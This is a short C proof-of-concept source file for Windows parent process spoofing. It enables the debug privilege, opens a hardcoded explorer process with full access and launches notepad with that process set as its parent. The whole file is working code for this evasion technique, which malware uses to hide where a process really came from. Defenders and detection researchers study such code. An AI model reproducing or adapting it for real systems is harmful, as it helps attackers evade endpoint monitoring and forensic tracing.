// Super basic POC for parent process spoofing
// Based on this example:
// https://raw.githubusercontent.com/3gstudent/From-System-authority-to-Medium-authority/master/SelectMyParent.cpp

#include <Windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdbool.h>

BOOL CurrentProcessAdjustToken(void)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES sTP;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sTP.Privileges[0].Luid))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		sTP.PrivilegeCount = 1;
		sTP.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if (!AdjustTokenPrivileges(hToken, 0, &sTP, sizeof(sTP), NULL, NULL))
		{
			CloseHandle(hToken);
			return FALSE;
		}
		CloseHandle(hToken);
		return TRUE;
	}
	return FALSE;
}

int _tmain(int argc, _TCHAR* argv[])
{
	STARTUPINFOEX sie = { sizeof(sie) };
	PROCESS_INFORMATION pi;
	SIZE_T cbAttributeListSize = 0;
	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
	HANDLE hParentProcess = NULL;
	DWORD dwPid = 0;
	// Name of the process we want to spawn
	TCHAR adoptedChild[] = _T("notepad");

	// hardcoded to be whatever explorer was when i ran this
	dwPid = 5712;

	InitializeProcThreadAttributeList(NULL, 1, 0, &cbAttributeListSize);
	
	pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, cbAttributeListSize);
	if (NULL == pAttributeList)
	{
		return 0;
	}
	
	if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &cbAttributeListSize))
	{
		return 0;
	}
	
	CurrentProcessAdjustToken();
	
	hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	
	if (NULL == hParentProcess)
	{
		return 0;
	}

	if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
	{
		return 0;
	}

	sie.lpAttributeList = pAttributeList;

	
	if (!CreateProcess(NULL, adoptedChild, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sie.StartupInfo, &pi))
	{
		return 0;
	}
	
	_tprintf(TEXT("Process created: %d\n"), pi.dwProcessId);

	int c;
	c = getchar();

	DeleteProcThreadAttributeList(pAttributeList);
	
	CloseHandle(hParentProcess);

	return 0;
}
